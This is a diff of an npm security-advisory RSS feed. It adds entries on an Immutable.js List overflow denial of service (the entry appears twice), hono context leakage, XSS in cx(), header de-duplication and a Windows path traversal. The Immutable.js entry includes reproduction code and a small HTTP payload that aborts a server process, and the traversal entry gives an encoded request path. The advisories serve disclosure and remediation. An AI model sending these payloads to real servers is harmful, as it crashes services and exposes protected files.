@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-07-21T17:40:47.593Z</updated>
+    <updated>2026-07-21T18:53:54.421Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,315 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[immutable] Immutable.js `List` 32-bit trie overflow → unrecoverable DoS]]></title>
+        <id>https://github.com/advisories/GHSA-v56q-mh7h-f735</id>
+        <link href="https://github.com/advisories/GHSA-v56q-mh7h-f735"/>
+        <updated>2026-07-21T18:36:31.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>List#set</code>, <code>List#setSize</code>, <code>List#setIn</code>, <code>List#updateIn</code> (and the functional <code>set</code> / <code>setIn</code> / <code>updateIn</code>) mishandle an index or size in the range <code>[2 ** 30, 2 ** 31)</code>:</p>
+<ul>
+<li>On an <strong>empty</strong> <code>List</code> the operation enters an <strong>uncatchable infinite loop</strong> (a tight CPU spin; a surrounding <code>try/catch</code> never regains control). Only killing the worker recovers it.</li>
+<li>On a <strong>populated</strong> <code>List</code> (≥ 32 elements — i.e. any array of ≥ 32 items turned into a <code>List</code> by <code>fromJS</code>) the loop allocates without bound → heap exhaustion → the <strong>process aborts</strong> (<code>SIGABRT</code>, exit <code>134</code>, or kernel OOM-kill <code>137</code>). A real crash, not a recoverable error.</li>
+</ul>
+<p>The index may be a <strong>numeric string</strong>, so it can come straight from a request body, URL, or key-path. A single small unauthenticated request is enough.</p>
+<p>There is also a companion <strong>silent data-corruption</strong> issue in <code>setSize</code>:</p>
+<pre><code class="language-js">List([1, 2, 3]).setSize(2 ** 31); // before fix =&gt; size 0  (silently cleared)
+List([1, 2, 3]).setSize(2 ** 32 + 5); // before fix =&gt; size 5  (huge value wraps to 5)
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>Availability only. A reachable configuration is any endpoint that routes untrusted input into a <code>List</code> index or a <code>setIn</code>/<code>updateIn</code> key-path — which the extremely common <code>state = fromJS(body); state.setIn(userPath, value)</code> pattern does (config stores, document/collection editors, redux-immutable reducers, JSON-Patch endpoints, etc.).</p>
+<p>No confidentiality or integrity impact, no RCE. The companion <code>setSize</code> bug can silently corrupt application state (wrong size) without crashing.</p>
+<h2 id="reproduction-immutable-517">Reproduction (immutable 5.1.7)</h2>
+<pre><code class="language-ts">import { fromJS, List } from 'immutable';
+
+// 1) Populated List: OOM -&gt; process abort (SIGABRT, exit 134) within ~2s
+fromJS({ items: new Array(64).fill(0) }).setIn(['items', '1073741824'], 'x');
+
+// 2) Empty List: hangs forever, uncatchable
+List().set(2 ** 30, 'x');
+
+// 3) Silent truncation
+List([1, 2, 3]).setSize(2 ** 31); // =&gt; size 0
+List([1, 2, 3]).setSize(2 ** 32 + 5); // =&gt; size 5
+</code></pre>
+<p>A remote 43-byte HTTP request (<code>{"path":["items","1073741824"],"value":"x"}</code>) is sufficient to abort a worker that applies it via <code>state = state.setIn(path, value)</code>.</p>
+<p>Any index in <code>[2 ** 30, 2 ** 31)</code> works (<code>1073741824</code>, <code>2000000000</code>, …). An index in <code>[2 ** 31, 2 ** 32)</code> does not crash — it silently wraps (clearing the List) via the same root cause.</p>
+<h2 id="root-cause">Root cause</h2>
+<p><code>List</code> stores its values in a 32-wide trie (<code>SHIFT = 5</code>, so each level addresses 5 more bits) and uses <strong>signed 32-bit bitwise arithmetic</strong> throughout <code>setListBounds()</code> (<code>src/List.js</code>):</p>
+<ol>
+<li><strong>Infinite loop (the hang / OOM).</strong> The level-raising loop</li>
+</ol>
+<pre><code class="language-js">while (newTailOffset &gt;= 1 &lt;&lt; (newLevel + SHIFT)) {
+  newRoot = new VNode(
+    newRoot &amp;&amp; newRoot.array.length ? [newRoot] : [],
+    owner
+  );
+  newLevel += SHIFT;
+}
+</code></pre>
+<p>relies on <code>1 &lt;&lt; (newLevel + SHIFT)</code>. A JavaScript shift count is taken <strong>mod 32</strong>, so once <code>newLevel + SHIFT</code> reaches <code>31</code> the term goes <strong>negative</strong> (<code>1 &lt;&lt; 31 === -2147483648</code>) and at <code>32</code> wraps to <code>1</code> (<code>1 &lt;&lt; 35 === 8</code>). The comparison then stays <code>true</code> forever and the loop never terminates. On a populated <code>List</code>, each iteration retains a new <code>VNode</code> (<code>[newRoot]</code>), so the heap fills and V8 aborts; on an empty <code>List</code> it spins on CPU without allocating.</p>
+<ol start="2">
+<li><strong>Silent wraparound (the <code>setSize</code> corruption).</strong> The <code>begin |= 0</code> / <code>end |= 0</code> coercion (<code>ToInt32</code>) silently wraps large finite values (<code>(2 ** 31) | 0 === -2147483648</code>, <code>(2 ** 32 + 5) | 0 === 5</code>), producing a wrong resulting size instead of an error.</li>
+</ol>
+<p>The threshold is <code>2 ** 30</code>: that is the largest size for which <code>1 &lt;&lt; (newLevel + SHIFT)</code> stays a valid positive 32-bit integer throughout the loops (<code>newLevel + SHIFT</code> stays ≤ 30).</p>
+<h2 id="remediation">Remediation</h2>
+<p>The fix is contained to <code>setListBounds()</code> in <code>src/List.js</code>:</p>
+<ol>
+<li><p><strong>Validate up front, before the lossy <code>| 0</code> coercion.</strong> Compute the intended origin and capacity in full precision and throw a clear, catchable <code>RangeError</code> when they exceed the addressable range (<code>MAX_LIST_SIZE = 2 ** 30</code>). <code>Infinity</code>/<code>NaN</code> are left to the existing <code>| 0 → 0</code> behaviour (so <code>setSize(Infinity)</code> stays <code>0</code> and <code>slice(0, Infinity)</code> still means "to the end").</p>
+</li>
+<li><p><strong>Stop the shift from wrapping.</strong> Replace <code>1 &lt;&lt; exp</code> in the level-raising loops with a helper that uses the cheap bitwise shift while it is exact (<code>exp ≤ 30</code>, the common path including every <code>push</code>/<code>setSize</code>/<code>slice</code>) and falls back to the non-wrapping <code>2 ** exp</code> only for the rare deep trees reached when a negative origin (<code>unshift</code> / negative index) is normalized to a large positive capacity (<code>exp</code> can reach 35 there, where <code>1 &lt;&lt; 35</code> would wrap to 8).</p>
+</li>
+</ol>
+<p>This turns every hang, the misleading <code>"Maximum call stack size exceeded"</code>, the OOM/<code>SIGABRT</code>, and the silent <code>setSize</code> truncation into one descriptive <code>RangeError</code>, preserves all behaviour for sizes <code>&lt; 2 ** 30</code>, and keeps the hot <code>push</code> path on the fast bitwise shift (the <code>2 ** exp</code> branch is never reached by non-negative operations).</p>
+<h3 id="is-the-new-limit-a-breaking-change">Is the new limit a breaking change?</h3>
+<p>No working code is affected. A <code>List</code> could never actually hold <code>≥ 2 ** 30</code> values before — the attempt hung, crashed, or silently corrupted the size. The limit was already implicit in the 32-bit trie; the fix only makes it explicit and catchable, mirroring native JS arrays (<code>new Array(2 ** 32)</code> → <code>RangeError: Invalid array length</code>). The single observable behaviour change is that <code>setSize(hugeValue)</code>, which used to return a silently wrong size, now throws. <code>2 ** 30</code> ≈ 1.07 billion entries (~8 GB of pointers alone), far beyond any practical use.</p>
+<h2 id="mitigations-for-users-who-cannot-upgrade-immediately">Mitigations (for users who cannot upgrade immediately)</h2>
+<ul>
+<li>Validate/clamp any externally supplied <code>List</code> index or <code>setIn</code>/<code>updateIn</code> key-path segment against a sane maximum before passing it to immutable.</li>
+<li>Reject numeric path segments <code>≥ 2 ** 30</code>.</li>
+<li>Run request handling in a worker that can be restarted, and cap the heap (<code>--max-old-space-size</code>) so an abort is contained.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/immutable-js/immutable-js/security/advisories/GHSA-v56q-mh7h-f735">https://github.com/immutable-js/immutable-js/security/advisories/GHSA-v56q-mh7h-f735</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59879">https://nvd.nist.gov/vuln/detail/CVE-2026-59879</a></li>
+<li><a href="https://github.com/immutable-js/immutable-js/commit/a1a1ee412dcaa380ab325196283d06594ffe4b84">https://github.com/immutable-js/immutable-js/commit/a1a1ee412dcaa380ab325196283d06594ffe4b84</a></li>
+<li><a href="https://github.com/immutable-js/immutable-js/commit/f0bc997d8eb9886aff2236635aa210a95a04304a">https://github.com/immutable-js/immutable-js/commit/f0bc997d8eb9886aff2236635aa210a95a04304a</a></li>
+<li><a href="https://github.com/immutable-js/immutable-js/releases/tag/v4.3.9">https://github.com/immutable-js/immutable-js/releases/tag/v4.3.9</a></li>
+<li><a href="https://github.com/immutable-js/immutable-js/releases/tag/v5.1.8">https://github.com/immutable-js/immutable-js/releases/tag/v5.1.8</a></li>
+<li><a href="https://github.com/advisories/GHSA-v56q-mh7h-f735">https://github.com/advisories/GHSA-v56q-mh7h-f735</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v56q-mh7h-f735</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-21T18:36:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[immutable] Immutable.js `List` 32-bit trie overflow → unrecoverable DoS]]></title>
+        <id>https://github.com/advisories/GHSA-v56q-mh7h-f735</id>
+        <link href="https://github.com/advisories/GHSA-v56q-mh7h-f735"/>
+        <updated>2026-07-21T18:36:31.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>List#set</code>, <code>List#setSize</code>, <code>List#setIn</code>, <code>List#updateIn</code> (and the functional <code>set</code> / <code>setIn</code> / <code>updateIn</code>) mishandle an index or size in the range <code>[2 ** 30, 2 ** 31)</code>:</p>
+<ul>
+<li>On an <strong>empty</strong> <code>List</code> the operation enters an <strong>uncatchable infinite loop</strong> (a tight CPU spin; a surrounding <code>try/catch</code> never regains control). Only killing the worker recovers it.</li>
+<li>On a <strong>populated</strong> <code>List</code> (≥ 32 elements — i.e. any array of ≥ 32 items turned into a <code>List</code> by <code>fromJS</code>) the loop allocates without bound → heap exhaustion → the <strong>process aborts</strong> (<code>SIGABRT</code>, exit <code>134</code>, or kernel OOM-kill <code>137</code>). A real crash, not a recoverable error.</li>
+</ul>
+<p>The index may be a <strong>numeric string</strong>, so it can come straight from a request body, URL, or key-path. A single small unauthenticated request is enough.</p>
+<p>There is also a companion <strong>silent data-corruption</strong> issue in <code>setSize</code>:</p>
+<pre><code class="language-js">List([1, 2, 3]).setSize(2 ** 31); // before fix =&gt; size 0  (silently cleared)
+List([1, 2, 3]).setSize(2 ** 32 + 5); // before fix =&gt; size 5  (huge value wraps to 5)
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>Availability only. A reachable configuration is any endpoint that routes untrusted input into a <code>List</code> index or a <code>setIn</code>/<code>updateIn</code> key-path — which the extremely common <code>state = fromJS(body); state.setIn(userPath, value)</code> pattern does (config stores, document/collection editors, redux-immutable reducers, JSON-Patch endpoints, etc.).</p>
+<p>No confidentiality or integrity impact, no RCE. The companion <code>setSize</code> bug can silently corrupt application state (wrong size) without crashing.</p>
+<h2 id="reproduction-immutable-517">Reproduction (immutable 5.1.7)</h2>
+<pre><code class="language-ts">import { fromJS, List } from 'immutable';
+
+// 1) Populated List: OOM -&gt; process abort (SIGABRT, exit 134) within ~2s
+fromJS({ items: new Array(64).fill(0) }).setIn(['items', '1073741824'], 'x');
+
+// 2) Empty List: hangs forever, uncatchable
+List().set(2 ** 30, 'x');
+
+// 3) Silent truncation
+List([1, 2, 3]).setSize(2 ** 31); // =&gt; size 0
+List([1, 2, 3]).setSize(2 ** 32 + 5); // =&gt; size 5
+</code></pre>
+<p>A remote 43-byte HTTP request (<code>{"path":["items","1073741824"],"value":"x"}</code>) is sufficient to abort a worker that applies it via <code>state = state.setIn(path, value)</code>.</p>
+<p>Any index in <code>[2 ** 30, 2 ** 31)</code> works (<code>1073741824</code>, <code>2000000000</code>, …). An index in <code>[2 ** 31, 2 ** 32)</code> does not crash — it silently wraps (clearing the List) via the same root cause.</p>
+<h2 id="root-cause">Root cause</h2>
+<p><code>List</code> stores its values in a 32-wide trie (<code>SHIFT = 5</code>, so each level addresses 5 more bits) and uses <strong>signed 32-bit bitwise arithmetic</strong> throughout <code>setListBounds()</code> (<code>src/List.js</code>):</p>
+<ol>
+<li><strong>Infinite loop (the hang / OOM).</strong> The level-raising loop</li>
+</ol>
+<pre><code class="language-js">while (newTailOffset &gt;= 1 &lt;&lt; (newLevel + SHIFT)) {
+  newRoot = new VNode(
+    newRoot &amp;&amp; newRoot.array.length ? [newRoot] : [],
+    owner
+  );
+  newLevel += SHIFT;
+}
+</code></pre>
+<p>relies on <code>1 &lt;&lt; (newLevel + SHIFT)</code>. A JavaScript shift count is taken <strong>mod 32</strong>, so once <code>newLevel + SHIFT</code> reaches <code>31</code> the term goes <strong>negative</strong> (<code>1 &lt;&lt; 31 === -2147483648</code>) and at <code>32</code> wraps to <code>1</code> (<code>1 &lt;&lt; 35 === 8</code>). The comparison then stays <code>true</code> forever and the loop never terminates. On a populated <code>List</code>, each iteration retains a new <code>VNode</code> (<code>[newRoot]</code>), so the heap fills and V8 aborts; on an empty <code>List</code> it spins on CPU without allocating.</p>
+<ol start="2">
+<li><strong>Silent wraparound (the <code>setSize</code> corruption).</strong> The <code>begin |= 0</code> / <code>end |= 0</code> coercion (<code>ToInt32</code>) silently wraps large finite values (<code>(2 ** 31) | 0 === -2147483648</code>, <code>(2 ** 32 + 5) | 0 === 5</code>), producing a wrong resulting size instead of an error.</li>
+</ol>
+<p>The threshold is <code>2 ** 30</code>: that is the largest size for which <code>1 &lt;&lt; (newLevel + SHIFT)</code> stays a valid positive 32-bit integer throughout the loops (<code>newLevel + SHIFT</code> stays ≤ 30).</p>
+<h2 id="remediation">Remediation</h2>
+<p>The fix is contained to <code>setListBounds()</code> in <code>src/List.js</code>:</p>
+<ol>
+<li><p><strong>Validate up front, before the lossy <code>| 0</code> coercion.</strong> Compute the intended origin and capacity in full precision and throw a clear, catchable <code>RangeError</code> when they exceed the addressable range (<code>MAX_LIST_SIZE = 2 ** 30</code>). <code>Infinity</code>/<code>NaN</code> are left to the existing <code>| 0 → 0</code> behaviour (so <code>setSize(Infinity)</code> stays <code>0</code> and <code>slice(0, Infinity)</code> still means "to the end").</p>
+</li>
+<li><p><strong>Stop the shift from wrapping.</strong> Replace <code>1 &lt;&lt; exp</code> in the level-raising loops with a helper that uses the cheap bitwise shift while it is exact (<code>exp ≤ 30</code>, the common path including every <code>push</code>/<code>setSize</code>/<code>slice</code>) and falls back to the non-wrapping <code>2 ** exp</code> only for the rare deep trees reached when a negative origin (<code>unshift</code> / negative index) is normalized to a large positive capacity (<code>exp</code> can reach 35 there, where <code>1 &lt;&lt; 35</code> would wrap to 8).</p>
+</li>
+</ol>
+<p>This turns every hang, the misleading <code>"Maximum call stack size exceeded"</code>, the OOM/<code>SIGABRT</code>, and the silent <code>setSize</code> truncation into one descriptive <code>RangeError</code>, preserves all behaviour for sizes <code>&lt; 2 ** 30</code>, and keeps the hot <code>push</code> path on the fast bitwise shift (the <code>2 ** exp</code> branch is never reached by non-negative operations).</p>
+<h3 id="is-the-new-limit-a-breaking-change">Is the new limit a breaking change?</h3>
+<p>No working code is affected. A <code>List</code> could never actually hold <code>≥ 2 ** 30</code> values before — the attempt hung, crashed, or silently corrupted the size. The limit was already implicit in the 32-bit trie; the fix only makes it explicit and catchable, mirroring native JS arrays (<code>new Array(2 ** 32)</code> → <code>RangeError: Invalid array length</code>). The single observable behaviour change is that <code>setSize(hugeValue)</code>, which used to return a silently wrong size, now throws. <code>2 ** 30</code> ≈ 1.07 billion entries (~8 GB of pointers alone), far beyond any practical use.</p>
+<h2 id="mitigations-for-users-who-cannot-upgrade-immediately">Mitigations (for users who cannot upgrade immediately)</h2>
+<ul>
+<li>Validate/clamp any externally supplied <code>List</code> index or <code>setIn</code>/<code>updateIn</code> key-path segment against a sane maximum before passing it to immutable.</li>
+<li>Reject numeric path segments <code>≥ 2 ** 30</code>.</li>
+<li>Run request handling in a worker that can be restarted, and cap the heap (<code>--max-old-space-size</code>) so an abort is contained.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/immutable-js/immutable-js/security/advisories/GHSA-v56q-mh7h-f735">https://github.com/immutable-js/immutable-js/security/advisories/GHSA-v56q-mh7h-f735</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59879">https://nvd.nist.gov/vuln/detail/CVE-2026-59879</a></li>
+<li><a href="https://github.com/immutable-js/immutable-js/commit/a1a1ee412dcaa380ab325196283d06594ffe4b84">https://github.com/immutable-js/immutable-js/commit/a1a1ee412dcaa380ab325196283d06594ffe4b84</a></li>
+<li><a href="https://github.com/immutable-js/immutable-js/commit/f0bc997d8eb9886aff2236635aa210a95a04304a">https://github.com/immutable-js/immutable-js/commit/f0bc997d8eb9886aff2236635aa210a95a04304a</a></li>
+<li><a href="https://github.com/immutable-js/immutable-js/releases/tag/v4.3.9">https://github.com/immutable-js/immutable-js/releases/tag/v4.3.9</a></li>
+<li><a href="https://github.com/immutable-js/immutable-js/releases/tag/v5.1.8">https://github.com/immutable-js/immutable-js/releases/tag/v5.1.8</a></li>
+<li><a href="https://github.com/advisories/GHSA-v56q-mh7h-f735">https://github.com/advisories/GHSA-v56q-mh7h-f735</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v56q-mh7h-f735</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-21T18:36:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[hono] hono/jsx does not isolate context per request, leading to cross-request data disclosure]]></title>
+        <id>https://github.com/advisories/GHSA-hvrm-45r6-mjfj</id>
+        <link href="https://github.com/advisories/GHSA-hvrm-45r6-mjfj"/>
+        <updated>2026-07-21T18:34:20.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>hono/jsx</code> did not isolate context values per request during server-side rendering. While an async component was suspended on <code>await</code>, its provided context value stayed observable to other requests rendering concurrently, so <code>useContext()</code> could return a value from a different in-flight request.</p>
+<h3 id="details">Details</h3>
+<p>During server-side rendering, context values were kept in a process-wide structure rather than scoped to each request's render. While an async component awaited, another request entering the same provider could observe or replace the value; when the first render resumed, it could read the other request's context.</p>
+<p>This affects the usual ways request-scoped data is passed through a server-rendered JSX tree:</p>
+<ul>
+<li><code>createContext()</code> / <code>useContext()</code></li>
+<li>the <code>jsxRenderer</code> middleware and <code>useRequestContext()</code></li>
+</ul>
+<p>It arises only when context is read after an <code>await</code> inside an async component while requests render concurrently. Reading context synchronously (before any <code>await</code>), purely synchronous rendering, and client-side (DOM) rendering are not affected.</p>
+<h3 id="impact">Impact</h3>
+<p>Under concurrent requests, a response could be rendered with another request's context. A user may receive HTML rendered for a different user, and an authorization check performed after an <code>await</code> may be evaluated against another user's data.</p>
+<p>This may lead to:</p>
+<ul>
+<li>disclosure of rendered output intended for another user</li>
+<li>authorization decisions made with the wrong request's context</li>
+<li>cross-request mixing of session or other request-scoped state</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/honojs/hono/security/advisories/GHSA-hvrm-45r6-mjfj">https://github.com/honojs/hono/security/advisories/GHSA-hvrm-45r6-mjfj</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59896">https://nvd.nist.gov/vuln/detail/CVE-2026-59896</a></li>
+<li><a href="https://github.com/honojs/hono/commit/fab3b13639339cbd5ba1166a5b23d9ac30c5f64f">https://github.com/honojs/hono/commit/fab3b13639339cbd5ba1166a5b23d9ac30c5f64f</a></li>
+<li><a href="https://github.com/honojs/hono/releases/tag/v4.12.27">https://github.com/honojs/hono/releases/tag/v4.12.27</a></li>
+<li><a href="https://github.com/advisories/GHSA-hvrm-45r6-mjfj">https://github.com/advisories/GHSA-hvrm-45r6-mjfj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hvrm-45r6-mjfj</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-21T18:34:19.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[hono] Hono: Server-Side XSS via JSX Escaping Bypass in cx() Utility]]></title>
+        <id>https://github.com/advisories/GHSA-w62v-xxxg-mg59</id>
+        <link href="https://github.com/advisories/GHSA-w62v-xxxg-mg59"/>
+        <updated>2026-07-21T18:33:50.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>cx()</code> in <code>hono/css</code> composes class names from plain strings but marks the result as already-escaped without HTML-escaping the input. When the result is used as a JSX <code>class</code> attribute during server-side rendering, the value is written into the attribute unescaped, so untrusted input can break out of the <code>class</code> attribute and inject arbitrary markup, leading to Cross-Site Scripting (XSS).</p>
+<h3 id="details">Details</h3>
+<p>Because the composed value is treated as pre-escaped, the HTML attribute escaping normally applied to interpolated values is skipped, and characters such as <code>"</code> pass through unescaped — allowing a value to terminate the attribute and add further attributes or elements. This arises when an application passes untrusted, user-controlled input as a class name to <code>cx()</code>, for example when merging a base class with an externally provided <code>className</code>.</p>
+<h3 id="impact">Impact</h3>
+<p>During server-side rendering, an attacker who controls a value passed to <code>cx()</code> can inject arbitrary HTML into the page, resulting in stored or reflected XSS in the victim's browser.</p>
+<p>This may lead to:</p>
+<ul>
+<li>Execution of attacker-controlled script in the victim's browser session.</li>
+<li>Session hijacking, credential theft, or actions performed on behalf of the victim.</li>
+</ul>
+<p>Applications are affected only if they render JSX server-side and pass untrusted input as a class name to <code>cx()</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/honojs/hono/security/advisories/GHSA-w62v-xxxg-mg59">https://github.com/honojs/hono/security/advisories/GHSA-w62v-xxxg-mg59</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59895">https://nvd.nist.gov/vuln/detail/CVE-2026-59895</a></li>
+<li><a href="https://github.com/honojs/hono/commit/cd3f6f7194f0e5c9d4b26ae0cf232018d0f388fc">https://github.com/honojs/hono/commit/cd3f6f7194f0e5c9d4b26ae0cf232018d0f388fc</a></li>
+<li><a href="https://github.com/honojs/hono/releases/tag/v4.12.27">https://github.com/honojs/hono/releases/tag/v4.12.27</a></li>
+<li><a href="https://github.com/advisories/GHSA-w62v-xxxg-mg59">https://github.com/advisories/GHSA-w62v-xxxg-mg59</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w62v-xxxg-mg59</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-21T18:33:50.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[hono] Hono: API Gateway v1 adapter can drop a distinct repeated request header value during de-duplication]]></title>
+        <id>https://github.com/advisories/GHSA-xgm2-5f3f-mvvc</id>
+        <link href="https://github.com/advisories/GHSA-xgm2-5f3f-mvvc"/>
+        <updated>2026-07-21T18:18:14.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The AWS API Gateway v1 adapter can drop a distinct repeated request header value. When a header appears multiple times, the adapter de-duplicates values using a substring comparison instead of an exact match, so a value that is a substring of another value of the same header is omitted (for example, <code>203.0.113.1</code> is dropped when another value is <code>203.0.113.10</code>).</p>
+<h3 id="details">Details</h3>
+<p>A repeated request header carries an ordered list of values. Middleware or application logic that depends on the complete list — such as IP restriction that walks the <code>X-Forwarded-For</code> chain, rate limiting, audit logging, or proxy-chain validation — can therefore receive incomplete data that differs from what the client actually sent.</p>
+<p>This issue arises on deployments using the AWS API Gateway v1 adapter (the same pattern also affects the VPC Lattice adapter), for requests that contain the same header more than once.</p>
+<h3 id="impact">Impact</h3>
+<p>An attacker can craft repeated header values so that one value is omitted before the application sees the request. Where a security or routing decision relies on the full chain, this can alter that decision.</p>
+<p>This affects applications deployed through Hono's AWS API Gateway v1 (or VPC Lattice) adapter that rely on the complete set of repeated request header values.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/honojs/hono/security/advisories/GHSA-xgm2-5f3f-mvvc">https://github.com/honojs/hono/security/advisories/GHSA-xgm2-5f3f-mvvc</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59897">https://nvd.nist.gov/vuln/detail/CVE-2026-59897</a></li>
+<li><a href="https://github.com/honojs/hono/commit/aa921770d09bc35970362d5a2630a878f6d982fd">https://github.com/honojs/hono/commit/aa921770d09bc35970362d5a2630a878f6d982fd</a></li>
+<li><a href="https://github.com/honojs/hono/releases/tag/v4.12.27">https://github.com/honojs/hono/releases/tag/v4.12.27</a></li>
+<li><a href="https://github.com/advisories/GHSA-xgm2-5f3f-mvvc">https://github.com/advisories/GHSA-xgm2-5f3f-mvvc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xgm2-5f3f-mvvc</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-21T18:18:13.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@hono/node-server] Node.js Adapter for Hono: Path traversal in `serve-static` on Windows via encoded backslash (`%5C`)]]></title>
+        <id>https://github.com/advisories/GHSA-frvp-7c67-39w9</id>
+        <link href="https://github.com/advisories/GHSA-frvp-7c67-39w9"/>
+        <updated>2026-07-21T18:17:25.000Z</updated>
+        <content type="html"><![CDATA[<p>The same as the <code>hono</code> core <a href="https://github.com/honojs/hono/security/advisories/GHSA-wwfh-h76j-fc44">Path traversal in <code>serve-static</code> on Windows via encoded backslash (<code>%5C</code>)</a>.</p>
+<h3 id="summary">Summary</h3>
+<p>On Windows hosts, an encoded backslash (<code>%5C</code>) in the request path decodes to <code>\</code>, which the Windows path resolver treats as a separator. <code>serve-static</code> then resolves a single URL segment such as <code>admin\secret.txt</code> into a nested file under the root and serves it, letting an attacker read static files meant to be protected behind prefix-mounted middleware. Directory escape (<code>..</code>) remains blocked.</p>
+<h3 id="details">Details</h3>
+<p>The router splits paths only on <code>/</code>, so <code>/admin%5Csecret.txt</code> is one segment and middleware on <code>/admin/*</code> does not run. The <code>serve-static</code> guard rejects <code>.</code>/<code>..</code> and consecutive separators but lets a lone <code>\</code> through; on Windows the file resolver re-splits it into the protected subtree.</p>
+<p>This affects Windows hosts serving static files via the Node, Bun, or Deno adapters that guard a static subtree with prefix-mounted middleware.</p>
+<h3 id="impact">Impact</h3>
+<p>An unauthenticated attacker can read static files under a middleware-guarded prefix on Windows hosts. The read stays within the configured root; escape outside the root is not possible.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/honojs/node-server/security/advisories/GHSA-frvp-7c67-39w9">https://github.com/honojs/node-server/security/advisories/GHSA-frvp-7c67-39w9</a></li>
+<li><a href="https://github.com/honojs/node-server/commit/cd076e117cfe4cb8d31f9eb11d2e8f38a6cb8faf">https://github.com/honojs/node-server/commit/cd076e117cfe4cb8d31f9eb11d2e8f38a6cb8faf</a></li>
+<li><a href="https://github.com/honojs/node-server/releases/tag/v2.0.5">https://github.com/honojs/node-server/releases/tag/v2.0.5</a></li>
+<li><a href="https://github.com/advisories/GHSA-frvp-7c67-39w9">https://github.com/advisories/GHSA-frvp-7c67-39w9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-frvp-7c67-39w9</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-21T18:17:25.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[astro] Astro: composable `astro/hono` pipeline bypasses `security.checkOrigin` when `middleware()` is absent or misordered]]></title>
         <id>https://github.com/advisories/GHSA-8mv7-9c27-98vc</id>
@@ -2155,1193 +2464,5 @@ try {
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-07-20T22:37:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[axios] Axios: HTTP/2 streamed uploads bypass `maxBodyLength`]]></title>
-        <id>https://github.com/advisories/GHSA-mwf2-3pr3-8698</id>
-        <link href="https://github.com/advisories/GHSA-mwf2-3pr3-8698"/>
-        <updated>2026-07-20T22:37:03.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Axios versions with Node.js HTTP/2 support allow streamed request bodies to bypass <code>maxBodyLength</code> enforcement when requests are sent with <code>httpVersion: 2</code>.</p>
-<p>This affects applications that rely on <code>maxBodyLength</code> as a hard cap while forwarding attacker-controlled streams, such as upload endpoints proxying user data to an upstream HTTP/2 service. Buffered request bodies are still checked before the request is sent.</p>
-<h2 id="impact">Impact</h2>
-<p>An attacker who can control a stream passed to axios can cause the application to transmit more outbound data than the configured <code>maxBodyLength</code> limit.</p>
-<p>Practical impact is limited to resource consumption and policy bypass: excess outbound bandwidth, egress cost, upstream quota consumption, and limited availability impact on the application or upstream peer. This does not provide code execution, credential disclosure, or request destination control.</p>
-<p>Browser adapters are not affected. Axios calls using the default unlimited <code>maxBodyLength: -1</code> do not cross this specific configured-limit boundary.</p>
-<h2 id="affected-functionality">Affected Functionality</h2>
-<p>Affected calls require all of the following:</p>
